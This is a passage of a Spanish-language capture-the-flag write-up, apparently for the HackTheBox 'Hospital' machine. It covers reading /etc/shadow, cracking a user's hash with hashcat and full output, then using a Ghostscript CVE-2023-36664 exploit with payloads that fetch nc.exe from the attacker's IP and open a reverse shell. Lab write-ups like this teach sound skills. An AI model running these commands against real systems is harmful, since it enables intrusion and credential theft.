@@ -276,3 +276,130 @@ chmod +x <exploit.sh>
 y lo ejecutamos 
 
 ./exploit.sh
+
+Obtendremos el acceso a root del web server
+
+hacemos un cat /etc/passwd para ver a los usuarios
+podemos ver a l usuario drwilliams
+
+procedemos a ver el el /etc/shadow
+
+donde podemos ver el hash de drwilliams y root
+
+lo guardamos en content
+
+procedemos a crackear el has con hashcat
+
+❯ hashcat hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2765/5594 MB (1024 MB allocatable), 16MCU
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashfile 'hash' on line 2 (root:$...eobZ1dzDs..dD:19612:0:99999:7:::): Token length exception
+
+* Token length exception: 1/2 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username option is used but no username is present)
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 1 sec
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
+Time.Started.....: Wed Dec 20 19:28:16 2023 (24 secs)
+Time.Estimated...: Wed Dec 20 20:27:54 2023 (59 mins, 14 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     4009 H/s (1.53ms) @ Accel:512 Loops:64 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 96768/14344384 (0.67%)
+Rejected.........: 0/96768 (0.00%)
+Restore.Point....: 96768/14344384 (0.67%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2880
+Candidate.Engine.: Device Generator
+Candidates.#1....: jessica101 -> ericalynn
+
+$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
+Time.Started.....: Wed Dec 20 19:28:16 2023 (54 secs)
+Time.Estimated...: Wed Dec 20 19:29:10 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     3951 H/s (1.42ms) @ Accel:512 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 214528/14344384 (1.50%)
+Rejected.........: 0/214528 (0.00%)
+Restore.Point....: 214016/14344384 (1.49%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: rayburn -> pkpkpk
+
+Started: Wed Dec 20 19:27:36 2023
+Stopped: Wed Dec 20 19:29:12 2023
+
+obteniendo el password
+
+de esta forma podemos ingresas a https://hospital.htb
+
+ingresamos el usuario y contraseNa que tenemos
+
+ingresamos al buzon de entrada y vemos algo referente Ghostscript
+
+damos una busqueda en google refrnte al tema y vemos una vulnerabilidad 
+https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
+
+❯ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.110:8000/nc64.exe -o nc.exe" --filename file.eps
+
+❯ python3 -m http.server
+
+❯ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.110 1111 -e cmd.exe" --filename file.eps
+
+❯ nc -nlvp 1111
